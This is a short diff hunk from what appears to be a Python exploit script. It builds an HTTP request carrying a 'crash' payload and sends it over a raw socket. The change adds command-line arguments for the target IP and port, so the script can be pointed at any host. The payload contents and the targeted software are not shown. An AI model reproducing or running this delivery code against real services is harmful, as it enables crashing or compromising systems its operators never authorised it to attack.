@@ -63,6 +63,9 @@ buffer+="Content-Length: "+str(len(crash))+"\r\n"
 buffer+="\r\n"
 buffer+=crash
 
+ip = sys.argv[1]
+port = sys.argv[2]
+
 exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 exploit.connect((ip, port))
 exploit.send(buffer)
